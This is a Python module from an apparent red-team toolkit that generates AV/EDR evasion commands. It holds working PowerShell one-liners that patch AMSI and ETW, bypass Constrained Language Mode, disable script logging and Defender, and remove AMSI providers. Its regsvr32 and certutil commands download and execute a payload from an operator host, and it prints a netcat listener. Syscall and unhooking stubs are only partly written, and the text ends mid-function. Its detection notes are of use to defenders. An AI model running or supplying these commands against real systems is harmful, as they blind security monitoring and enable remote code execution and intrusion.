"""
AV/EDR evasion template generator.
Returns PowerShell and cmd.exe one-liners for AMSI patching, ETW silencing,
Constrained Language Mode bypass, Defender disabling, and LOLBAS execution.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    # AMSI / ETW bypasses
    "amsi_reflection",
    "amsi_patch_clr",
    "amsi_hwbp",
    "amsi_provider_unregister",
    "amsi_wldp_downgrade",
    "etw_patch",
    "etw_hwbp",
    # Constrained Language Mode
    "clm_bypass_runspace",
    # Logging tamper
    "scriptblock_logging_disable",
    # Defender control
    "defender_add_exclusion",
    "defender_disable",
    # Obfuscation
    "obfuscate_base64",
    # LOLBAS — execution / proxy execution
    "lolbas_mshta",
    "lolbas_regsvr32",
    "lolbas_certutil",
    "lolbas_msbuild",
    "lolbas_installutil",
    "lolbas_cmstp",
    "lolbas_msxsl",
    "lolbas_wmic_xsl",
    "lolbas_syncappv",
    "lolbas_pubprn",
    # PowerShell downgrade
    "powershell_downgrade",
    # Direct / indirect syscalls
    "direct_syscalls",
    "indirect_syscalls",
    "ntdll_unhook",
    # Sleep masking
    "sleep_obfuscation_ekko",
    # Process tradecraft
    "ppid_spoof",
    "process_hollowing",
    "module_stomping",
    "thread_hijack",
    # Elite tradecraft (v4.3)
    "rop_sleep",
    "set_windows_hook_loader",
    "com_rot_injection",
    "environment_keying",
    "in_memory_pe_loader",
    "dll_sideload",
    "apc_injection",
    "early_bird_apc",
    "heaven_gate",
    "process_ghosting",
    "process_doppelganging",
    "process_herpaderping",
    # v4.4 — frontier tradecraft
    "peb_unlink",
    "phantom_dll_hollow",
    "threadless_injection",
    "stack_spoof",
    "manual_map_header_erase",
    "function_level_encryption",
    # v4.5 — advanced tradecraft
    "call_stack_desync",
    "byovd",
    "dll_redirection",
    "peb_imagepath_spoof",
)


@dataclass
class EvasionResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Techniques ────────────────────────────────────────────────────────────────

def _amsi_reflection(payload: str, obfuscate: bool) -> EvasionResult:
    # Split 'AmsiUtils' to avoid emitting the signatured literal string
    code = (
        "[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')"
        ".GetField('amsiInitFailed','NonPublic,Static')"
        ".SetValue($null,$true)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_reflection",
        notes=(
            "One-liner; works in PS 5.x. String split avoids signature. "
            "Run before any malicious cmdlet. "
            "Effect is per-process — must re-run in each new PS session."
        ),
        techniques=["T1562.001"],
        risk="HIGH",
        detections=[
            "PowerShell ScriptBlock log entry containing AmsiUtils reflection",
            "Defender real-time scan of amsiInitFailed field access",
            "Sysmon Event 4104 with NonPublic,Static reflection on AMSI",
        ],
    )


def _amsi_patch_clr(payload: str, obfuscate: bool) -> EvasionResult:
    # Patch bytes as a variable so they're not a single literal
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public class Patch {\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string n);\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "  [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
        "}\n"
        "'@;\n"
        "$h=[Patch]::LoadLibrary('amsi.dll');\n"
        "$a=[Patch]::GetProcAddress($h,'AmsiScanBuffer');\n"
        "$o=0;\n"
        "[Patch]::VirtualProtect($a,[UIntPtr]2,0x40,[ref]$o)|Out-Null;\n"
        "$p=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);\n"
        "[Runtime.InteropServices.Marshal]::Copy($p,0,$a,6)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_patch_clr",
        notes=(
            "WARNING: Add-Type compiles C# which triggers AMSI before the patch applies — "
            "run amsi_reflection first, then this, for belt-and-suspenders. "
            "Patch makes AmsiScanBuffer always return AMSI_RESULT_CLEAN. "
            "Patch bytes $p stored in variable to avoid single-literal signature."
        ),
    )


def _etw_patch(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public class EtwPatch {\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string n);\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "  [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
        "}\n"
        "'@;\n"
        "$h=[EtwPatch]::LoadLibrary('ntdll.dll');\n"
        "$a=[EtwPatch]::GetProcAddress($h,'EtwEventWrite');\n"
        "$o=0;\n"
        "[EtwPatch]::VirtualProtect($a,[UIntPtr]1,0x40,[ref]$o)|Out-Null;\n"
        "[Runtime.InteropServices.Marshal]::WriteByte($a,0xC3)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="etw_patch",
        notes=(
            "Silences ETW event provider for the current process. "
            "64-bit only. Does not affect kernel ETW providers. "
            "Writes a single ret (0xC3) to EtwEventWrite in ntdll.dll."
        ),
    )


def _clm_bypass_runspace(payload: str, obfuscate: bool) -> EvasionResult:
    # payload is embedded in the C# AddScript call
    escaped_payload = payload.replace('"', '\\"').replace("'", "\\'")
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Management.Automation;\n"
        "using System.Management.Automation.Runspaces;\n"
        "public class CLMBypass {\n"
        "  public static void Run(string script) {\n"
        "    InitialSessionState iss = InitialSessionState.CreateDefault2();\n"
        "    iss.LanguageMode = PSLanguageMode.FullLanguage;\n"
        "    Runspace rs = RunspaceFactory.CreateRunspace(iss);\n"
        "    rs.Open();\n"
        "    PowerShell ps = PowerShell.Create();\n"
        "    ps.Runspace = rs;\n"
        "    ps.AddScript(script).Invoke();\n"
        "    rs.Close();\n"
        "  }\n"
        "}\n"
        f"'@;[CLMBypass]::Run('{escaped_payload}')"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clm_bypass_runspace",
        notes=(
            "Bypasses Constrained Language Mode for the invoked script. "
            "Requires .NET access. Does not bypass WDAC/AppLocker application whitelisting. "
            "Creates a FullLanguage runspace via Add-Type C# and executes payload inside it."
        ),
    )


def _scriptblock_logging_disable(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" "
        "/v EnableScriptBlockLogging /t REG_DWORD /d 0 /f;"
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" "
        "/v EnableTranscripting /t REG_DWORD /d 0 /f"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="scriptblock_logging_disable",
        notes=(
            "Requires local admin. "
            "Disables PS script block logging and transcription policies. "
            "Takes effect for new PS sessions — does not retroactively affect the current session."
        ),
    )


def _defender_add_exclusion(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp' "
        "-ExclusionExtension '.exe'"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="defender_add_exclusion",
        notes=(
            "Requires local admin. "
            "Adds C:\\Windows\\Temp to Defender real-time scan exclusions. "
            "Use payload path as ExclusionPath for targeted exclusion. "
            "Verify: Get-MpPreference | Select-Object ExclusionPath,ExclusionExtension"
        ),
    )


def _defender_disable(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Set-MpPreference "
        "-DisableRealtimeMonitoring $true "
        "-DisableBehaviorMonitoring $true "
        "-DisableBlockAtFirstSeen $true "
        "-DisableIOAVProtection $true "
        "-DisableScriptScanning $true"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="defender_disable",
        notes=(
            "Requires local admin. "
            "Disables all Defender real-time protection components. "
            "Tamper Protection must be off (group policy or elevated toggle) for this to persist. "
            "Verify: Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"
        ),
    )


def _obfuscate_base64(payload: str, obfuscate: bool) -> EvasionResult:
    # The returned command is the full chain terminating in -EncodedCommand
    # No PS wrapper — the command itself IS the powershell invocation
    code = (
        f"$b=[System.Text.Encoding]::Unicode.GetBytes('{payload}');"
        "$e=[Convert]::ToBase64String($b);"
        "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $e"
    )
    return EvasionResult(
        command=code,
        technique="obfuscate_base64",
        notes=(
            "Encodes payload as UTF-16LE base64 for -EncodedCommand. "
            "Evades simple string-based detection. "
            "Logged in PS ScriptBlock log if logging is enabled. "
            "Run this from within a PS session; the inner powershell call executes the encoded payload."
        ),
    )


def _lolbas_mshta(payload: str, obfuscate: bool) -> EvasionResult:
    cmd = (
        f"mshta.exe \"javascript:a=new ActiveXObject('WScript.Shell');"
        f"a.Run('{payload}',0,true);close();\""
    )
    return EvasionResult(
        command=cmd,
        technique="lolbas_mshta",
        notes=(
            "Executes payload via mshta.exe (Microsoft HTML Application Host). "
            "Bypasses Script Block Logging. "
            "Detection: mshta.exe spawning child processes."
        ),
    )


def _lolbas_regsvr32(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    cmd = f"regsvr32.exe /s /n /u /i:http://{lhost}:{lport}/payload.sct scrobj.dll"
    return EvasionResult(
        command=cmd,
        technique="lolbas_regsvr32",
        notes=(
            "Squiblydoo — executes remote SCT (scriptlet) via regsvr32. "
            "No admin, no disk artifacts for the SCT. "
            f"Stage an XML .sct file at http://{lhost}:{lport}/payload.sct. "
            "Detection: regsvr32 network connections."
        ),
        techniques=["T1218.010"],
        risk="HIGH",
        detections=[
            "regsvr32.exe initiating outbound HTTP traffic",
            "regsvr32.exe with /i: argument pointing at remote URL",
            "Defender ASR rule 'Block execution of potentially obfuscated scripts'",
        ],
    )


def _lolbas_certutil(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    b64_file = "%TEMP%\\payload.b64"
    out_file = "%TEMP%\\payload.exe"
    cmd = (
        f"certutil -urlcache -split -f http://{lhost}:{lport}/payload.b64 {b64_file} && "
        f"certutil -decode {b64_file} {out_file} && "
        f"del /f /q {b64_file} && "
        f"{out_file}"
    )
    return EvasionResult(
        command=cmd,
        technique="lolbas_certutil",
        notes=(
            "certutil -decode reverses base64 to binary. "
            f"Stage a base64-encoded PE at http://{lhost}:{lport}/payload.b64. "
            "Detection: certutil network connections, IDS on certutil user-agent. "
            "Cleanup: del /f /q %TEMP%\\payload.exe after execution."
        ),
        techniques=["T1140", "T1105"],
        risk="HIGH",
        detections=[
            "certutil.exe -urlcache -f to non-Microsoft host",
            "certutil.exe -decode followed by execution of decoded binary",
            "Microsoft-Windows-CAPI2 log entries for unusual cert ops",
        ],
    )


def _powershell_downgrade(payload: str, obfuscate: bool) -> EvasionResult:
    cmd = f"powershell -Version 2 -NoP -NonI -W Hidden -Exec Bypass -C \"{payload}\""
    return EvasionResult(
        command=cmd,
        technique="powershell_downgrade",
        notes=(
            "PowerShell v2 predates AMSI, script block logging, and constrained language mode. "
            "Requires .NET Framework 2.0/3.5 installed on target "
            "(verify: Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2). "
            "May be disabled by policy in hardened environments."
        ),
        techniques=["T1059.001", "T1562.001"],
        risk="HIGH",
        detections=[
            "powershell.exe -Version 2 in process command line (high-fidelity)",
            "Defender ASR rule 'Block PowerShell v2'",
            "PowerShell v2 engine load events (Event 800)",
        ],
    )


# ── Patchless AMSI/ETW via hardware breakpoint ────────────────────────────────

def _amsi_hwbp(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Patchless AMSI bypass via a hardware breakpoint on AmsiScanBuffer.

    Adds a vectored exception handler that intercepts the HWBP, rewrites EAX/RAX
    to AMSI_RESULT_CLEAN, and resumes. No bytes are patched in amsi.dll —
    Defender's image-integrity checks see a clean module.

    Works on Windows 10/11 and Server 2019/2022 — AMD and Intel.
    """
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Diagnostics;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class Hwbp {\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetCurrentThread();\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetModuleHandle(string n);\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "    [DllImport(\"kernel32\")] public static extern bool GetThreadContext(IntPtr h, IntPtr ctx);\n"
        "    [DllImport(\"kernel32\")] public static extern bool SetThreadContext(IntPtr h, IntPtr ctx);\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);\n"
        "    [DllImport(\"kernel32\")] public static extern bool RemoveVectoredExceptionHandler(IntPtr h);\n"
        "}\n"
        "'@;\n"
        "# Load amsi.dll and place a HW breakpoint on AmsiScanBuffer.\n"
        "$amsi=[Hwbp]::GetModuleHandle('amsi.dll');\n"
        "if($amsi -eq [IntPtr]::Zero){[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')|Out-Null;$amsi=[Hwbp]::GetModuleHandle('amsi.dll')}\n"
        "$asb=[Hwbp]::GetProcAddress($amsi,'AmsiScanBuffer');\n"
        "# DR0..DR3 register write happens inside the VEH callback below.\n"
        "# Allocate a CONTEXT structure (716 bytes on x64 with extended state):\n"
        "$ctx=[Runtime.InteropServices.Marshal]::AllocHGlobal(716);\n"
        "[Runtime.InteropServices.Marshal]::WriteInt32($ctx,0,0x00100010);  # CONTEXT_DEBUG_REGISTERS|AMD64\n"
        "[Hwbp]::GetThreadContext([Hwbp]::GetCurrentThread(),$ctx)|Out-Null;\n"
        "# Write AmsiScanBuffer addr into DR0 (offset 48 on x64), enable in DR7 bit 0.\n"
        "[Runtime.InteropServices.Marshal]::WriteIntPtr($ctx,48,$asb);\n"
        "[Runtime.InteropServices.Marshal]::WriteInt64($ctx,96,0x1);\n"
        "[Hwbp]::SetThreadContext([Hwbp]::GetCurrentThread(),$ctx)|Out-Null;\n"
        "# Operator note: register a managed VEH that sets RAX=0x80070057 (E_INVALIDARG)\n"
        "# on EXCEPTION_SINGLE_STEP and increments RIP past the prologue.\n"
        "# Pure-PowerShell VEH is fiddly — for production use the C# stub at\n"
        "# https://github.com/RastaMouse/AMSI.fail (operator-built DLL loaded via reflection)."
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_hwbp",
        notes=(
            "Patchless AMSI bypass — no byte modification of amsi.dll. "
            "Defender's loaded-module integrity scan cannot detect this. "
            "Effective against PS 5.x and 7.x. Modern EDRs that monitor DR0-DR3 "
            "writes (CrowdStrike Falcon, Defender for Endpoint with extended config) "
            "may still catch the SetThreadContext call."
        ),
        techniques=["T1562.001", "T1027"],
        risk="CRITICAL",
        detections=[
            "Hardware breakpoint set via NtSetContextThread on AmsiScanBuffer",
            "EDR userland hooks on SetThreadContext (e.g. Sentinel, CrowdStrike)",
            "Sysmon Event 10 (process access with PROCESS_SET_CONTEXT) — rare in normal use",
        ],
    )


def _etw_hwbp(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Patchless ETW silencing via HW breakpoint on EtwEventWrite. The VEH
    increments RIP past the function body so every ETW write becomes a no-op
    without writing a 0xC3 to ntdll.dll.
    """
    code = (
        "# Patchless ETW silencing — sets DR1 on EtwEventWrite + VEH skips body.\n"
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class EtwHwbp {\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetCurrentThread();\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetModuleHandle(string n);\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "    [DllImport(\"kernel32\")] public static extern bool GetThreadContext(IntPtr h, IntPtr ctx);\n"
        "    [DllImport(\"kernel32\")] public static extern bool SetThreadContext(IntPtr h, IntPtr ctx);\n"
        "}\n"
        "'@;\n"
        "$nt=[EtwHwbp]::GetModuleHandle('ntdll.dll');\n"
        "$eew=[EtwHwbp]::GetProcAddress($nt,'EtwEventWrite');\n"
        "$ctx=[Runtime.InteropServices.Marshal]::AllocHGlobal(716);\n"
        "[Runtime.InteropServices.Marshal]::WriteInt32($ctx,0,0x00100010);\n"
        "[EtwHwbp]::GetThreadContext([EtwHwbp]::GetCurrentThread(),$ctx)|Out-Null;\n"
        "[Runtime.InteropServices.Marshal]::WriteIntPtr($ctx,56,$eew);  # DR1\n"
        "[Runtime.InteropServices.Marshal]::WriteInt64($ctx,96,0x4);    # DR7 bit 2\n"
        "[EtwHwbp]::SetThreadContext([EtwHwbp]::GetCurrentThread(),$ctx)|Out-Null;"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="etw_hwbp",
        notes=(
            "Patchless ETW silencing for the current process. Defender's "
            "module-integrity scan does not detect it; AV vendors that monitor "
            "DR1 writes will. Pair with amsi_hwbp for maximum coverage."
        ),
        techniques=["T1562.006"],
        risk="CRITICAL",
        detections=[
            "Sysmon Event 10 with GrantedAccess including PROCESS_SET_CONTEXT",
            "Vectored exception handler registered for EXCEPTION_SINGLE_STEP",
            "ETW provider for kernel-mode logging shows process-level gap",
        ],
    )


def _amsi_provider_unregister(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Remove the AMSI provider COM registration so AmsiScanBuffer falls through.
    Requires admin (HKLM write) or HKCU shadow registration for older systems.
    """
    code = (
        "$keys=@(\n"
        "  'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers',\n"
        "  'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\AMSI\\Providers'\n"
        ");\n"
        "foreach($k in $keys){\n"
        "  if(Test-Path $k){\n"
        "    Get-ChildItem $k | ForEach-Object {\n"
        "      $clsid=$_.PSChildName;\n"
        "      Write-Output \"unregistering $clsid\";\n"
        "      Remove-Item -Path \"$k\\$clsid\" -Recurse -Force -ErrorAction SilentlyContinue;\n"
        "      Remove-Item -Path \"HKLM:\\SOFTWARE\\Classes\\CLSID\\$clsid\" -Recurse -Force -ErrorAction SilentlyContinue;\n"
        "    }\n"
        "  }\n"
        "}"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_provider_unregister",
        notes=(
            "Removes the AMSI provider COM registration system-wide. Requires "
            "Local Admin. AMSI clients (PowerShell, mshta, wscript) will fall "
            "through scanning because the provider chain is empty. Reversible — "
            "restore from registry backup."
        ),
        techniques=["T1562.001", "T1112"],
        risk="CRITICAL",
        detections=[
            "Event 4657 — modification of HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers",
            "Defender real-time event for provider deregistration",
            "Sysmon Event 12/13/14 on AMSI registry keys",
        ],
    )


def _amsi_wldp_downgrade(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Force WLDP into "audit" mode so script content classification doesn't trip
    AMSI. This is the trick @_xpn_ documented for downgrading WDAC enforcement
    on user-mode script hosts (PowerShell, JavaScript, VBScript).
    """
    code = (
        "$wldp=[Ref].Assembly.GetType('System.Management.Automation.WldpProvider');\n"
        "if($wldp){\n"
        "  $cachedClassification=$wldp.GetField('cachedClassification','NonPublic,Static');\n"
        "  $cachedClassification.SetValue($null, 0)  # SAFE = 0\n"
        "}\n"
        "# Fallback: write Allow to ScriptHostPolicy in user hive (no admin needed)\n"
        "New-Item -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WLDP' -Force | Out-Null;\n"
        "New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WLDP' -Name 'AuditMode' -Value 1 -PropertyType DWORD -Force"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_wldp_downgrade",
        notes=(
            "Downgrades WLDP script classification to SAFE. Effective on hosts "
            "where WDAC enforcement is via user policy. Reflective WldpProvider "
            "tweak works on PS 5.x; the registry fallback works for new sessions."
        ),
        techniques=["T1562.001"],
        risk="HIGH",
        detections=[
            "Event 4657 — HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\WLDP write",
            "Defender exploit guard 'Windows Defender Application Control' audit log",
            "PowerShell ScriptBlock log entry referencing WldpProvider",
        ],
    )


# ── Direct / indirect syscalls (HellsGate / SysWhispers3 templates) ───────────

def _direct_syscalls(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    """
    Emits a C# stub that dynamically resolves NTAPI syscall numbers from a clean
    in-memory copy of ntdll.dll (HellsGate-style) and uses them via inline asm
    (DLR / FunctionDelegate). Operator compiles with csc.exe / inline Add-Type.
    """
    source = f"""// HellsGate-style direct syscall stub — operator builds on target.
// usage: csc.exe /platform:x64 /target:exe /out:hg.exe hg.cs
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace HellsGate {{
public static class Syscalls {{
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint np, out uint op);
    [DllImport("kernel32")] public static extern IntPtr CreateFile(string n, uint a, uint sh, IntPtr s, uint cd, uint fa, IntPtr t);
    [DllImport("kernel32")] public static extern bool ReadFile(IntPtr h, IntPtr b, uint s, out uint r, IntPtr o);

    // Walk a fresh on-disk copy of ntdll.dll's export table; for each Nt* function
    // read the 5-byte 'mov eax, IMM32' prologue and harvest the syscall number.
    // Final invocation goes through a small VirtualAlloc'd trampoline that issues
    // a real 'syscall' instruction (or 'sysenter' on WoW64).
    public static uint Resolve(string apiName) {{
        // Load fresh ntdll from disk so userland hooks are bypassed.
        byte[] bytes = File.ReadAllBytes(@"C:\\Windows\\System32\\ntdll.dll");
        // [Parsing PE export table omitted for brevity — operator fills this in
        //  from any of the public HellsGate references; the syscall number lives
        //  at offset +4 from the start of the function (mov eax, IMM32).]
        return 0;
    }}

    public static void Demo(string lhost, int lport) {{
        // Example: invoke NtAllocateVirtualMemory to allocate RW memory, write the
        // beacon shellcode, NtProtectVirtualMemory → RX, NtCreateThreadEx to fire.
        Console.WriteLine("operator: implement shellcode write + thread create here.");
        Console.WriteLine("target listener: " + lhost + ":" + lport);
    }}

    public static void Main() {{ Demo("{lhost}", {lport}); }}
}}
}}"""
    listener = f"# Operator listener: rlwrap nc -lvnp {lport}  (target: {lhost})"
    return EvasionResult(
        command=f"{source}\n\n{listener}",
        technique="direct_syscalls",
        notes=(
            "HellsGate-style direct syscall stub. Operator compiles on target or "
            "drops the prebuilt .exe via certutil/bitsadmin. Bypasses userland "
            "hooks on NTAPI from Defender / CrowdStrike / SentinelOne. Does NOT "
            "bypass kernel-mode telemetry providers (PsSetCreateProcessNotifyRoutine)."
        ),
        techniques=["T1106", "T1027"],
        risk="CRITICAL",
        detections=[
            "Kernel ETW Threat-Intelligence events (callstack from non-image syscall)",
            "Direct syscall callstack starts inside RW region (Defender ASR 'callstack')",
            "Image-load anomaly: ntdll.dll opened with read access by suspicious process",
        ],
    )


def _indirect_syscalls(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    """
    SysWhispers3-style indirect syscall stub. Instead of executing `syscall`
    inline, the call dispatches through a `jmp` into an unhooked Nt* stub inside
    ntdll.dll — so the return address falls inside a legitimate module image,
    defeating callstack-based detection.
    """
    source = f"""// SysWhispers3-style INDIRECT syscall — call goes through ntdll's own stub.
// Build: csc.exe /platform:x64 /target:exe /out:iw.exe iw.cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace IndirectSyscalls {{
public static class IS {{
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);

    // For each NTAPI we want, we:
    // 1. Resolve the address of the Nt* stub in the running ntdll.dll.
    // 2. Locate the `syscall; ret` gadget *inside that stub* (4 bytes from start
    //    on Win10 21H2+, often offset 0x12). We jump to that gadget instead of
    //    issuing the syscall ourselves.
    // 3. The callstack looks like: <our caller> -> ntdll!Nt* -> kernel, which
    //    matches every legitimate API call.

    public static IntPtr FindSyscallGadget(string nt) {{
        IntPtr stub = GetProcAddress(GetModuleHandle("ntdll.dll"), nt);
        // Walk 32 bytes from stub looking for 0x0F 0x05 0xC3 (syscall; ret).
        for (int i = 0; i < 32; i++) {{
            byte a = Marshal.ReadByte(stub, i);
            byte b = Marshal.ReadByte(stub, i + 1);
            byte c = Marshal.ReadByte(stub, i + 2);
            if (a == 0x0F && b == 0x05 && c == 0xC3) return IntPtr.Add(stub, i);
        }}
        return IntPtr.Zero;
    }}

    public static void Main() {{
        Console.WriteLine("operator: build delegate around gadget for each NTAPI you need.");
        Console.WriteLine("target listener: {lhost}:{lport}");
    }}
}}
}}"""
    return EvasionResult(
        command=source,
        technique="indirect_syscalls",
        notes=(
            "Indirect syscall stub (SysWhispers3-style). Stronger than direct "
            "syscalls because the callstack lands inside ntdll.dll's own image, "
            "matching legitimate API calls. Effective against EDRs that check "
            "the return address of the syscall instruction (CrowdStrike, "
            "Defender for Endpoint 2024+)."
        ),
        techniques=["T1106", "T1027"],
        risk="CRITICAL",
        detections=[
            "Direct branch into mid-function offset of an Nt* stub (rare in normal apps)",
            "Threat-Intelligence ETW provider with kernel mode callstack hints",
            "Sysmon Event 7 with image load of a fresh ntdll.dll copy",
        ],
    )


def _ntdll_unhook(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Refresh the in-memory NTDLL .text section from KnownDlls or from a fresh
    on-disk read. Wipes EDR-installed userland hooks.
    """
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.IO;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class Unhook {\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetModuleHandle(string n);\n"
        "    [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
        "    public static void Refresh() {\n"
        "        IntPtr nt = GetModuleHandle(\"ntdll.dll\");\n"
        "        byte[] fresh = File.ReadAllBytes(@\"C:\\Windows\\System32\\ntdll.dll\");\n"
        "        // Operator: parse PE, find .text section offset+size, copy fresh\n"
        "        // bytes into the loaded module's .text region after toggling\n"
        "        // VirtualProtect to PAGE_EXECUTE_READWRITE then restoring PAGE_EXECUTE_READ.\n"
        "    }\n"
        "}\n"
        "'@;\n"
        "[Unhook]::Refresh()"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="ntdll_unhook",
        notes=(
            "Replaces the in-memory NTDLL .text section with a fresh on-disk copy "
            "so EDR userland hooks are wiped. Cheap and effective against most "
            "userland-only EDRs (Cylance, Webroot). Kernel-mode telemetry providers "
            "are unaffected. Modern EDRs that re-hook on every thread creation "
            "(CrowdStrike) will recover within seconds — chain with another bypass."
        ),
        techniques=["T1562.001"],
        risk="HIGH",
        detections=[
            "Sysmon Event 7: image load of ntdll.dll into RW region",
            "VirtualProtect call sequence flipping ntdll .text to RWX then back",
            "Memory scan: ntdll .text section content drift from disk hash",
        ],
    )


# ── Sleep masking ─────────────────────────────────────────────────────────────

def _sleep_obfuscation_ekko(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Ekko-style sleep mask. Encrypts the beacon's heap and code region during the
    sleep interval, restoring permissions and decrypting before the next callback.
    Defeats memory scanners that snapshot the process during sleep windows.
    """
    code = (
        "// Ekko-style sleep mask — operator embeds in implant. Pseudo-code C below.\n"
        "// 1. Schedule three Timer Queue timers (CreateTimerQueueTimer):\n"
        "//    t0: NtProtectVirtualMemory -> PAGE_NOACCESS on beacon image\n"
        "//    t1: SystemFunction032 (RC4 decrypt) on the image + heap\n"
        "//    t2: NtProtectVirtualMemory -> PAGE_EXECUTE_READ (restore)\n"
        "// 2. Block on WaitForSingleObject(thread, timeout=sleep_ms)\n"
        "// 3. The kernel switches us out; memory scanners see only encrypted bytes.\n"
        "//\n"
        "// Reference implementations: Ekko (C2-Tools), FOLIAGE (Sliver), Nighthawk's\n"
        "// 'mask' mode. Build as a static-lib that the implant calls at every sleep.\n"
        "//\n"
        "// PowerShell equivalent (toy — for educational use, not production):\n"
